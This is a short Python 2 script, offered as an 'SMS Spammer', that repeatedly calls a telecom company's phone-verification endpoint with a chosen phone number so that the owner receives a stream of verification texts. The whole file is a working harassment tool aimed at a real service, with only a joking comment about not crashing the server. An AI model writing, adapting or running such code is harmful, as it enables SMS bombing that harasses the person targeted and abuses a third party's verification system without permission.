#!/usr/bin/python
#Twitter: https://twitter.com/KendoClaw1

import argparse
import requests
from time import sleep

print """
########################
#                      #
#    SMS Spammer       #
#                      #
#   By: KendoClaw1     #
#                      #
########################
"""
print "To stop the script Press CTRL + C"


parser = argparse.ArgumentParser(description="SMS Spammer By KendoClaw1")
parser.add_argument("-p", help="PhoneNumber to send SMS to.",type=int,metavar="PhoneNumber")
parser.add_argument("-n", help="Number of SMS's to send",type=int,metavar="NumOfSMS")
args = parser.parse_args()


phonenumber =  args.p
if args.n:
	howmanysms= args.n
else:
	howmanysms = 20

def sendsms(number):
	url = "http://etisalat.eg/dashboard/verify/sendVerificationCode"
	params = {'dial':number,'lang':'ar'}
	headers = {'Host':'etisalat.eg','Content-Type':'application/json;charset=utf-8','X-TS-AJAX-Request':'True'}
	payload = {"dial":number,"lang":"ar","timeStamp":"timeStamp"}
	req = requests.post(url,params=params,headers=headers,json=payload)

def main():
	print "Sending SMS's please wait"
	for x in range(0,howmanysms):
		sendsms(phonenumber)
		#To slow down the requests to avoid crashing the server :)
		sleep(5)
	print "Sending Done."

if args.p:
	main()
else:
	print "\nMissing Argument: Please Specify a Phone Number using -p\n"
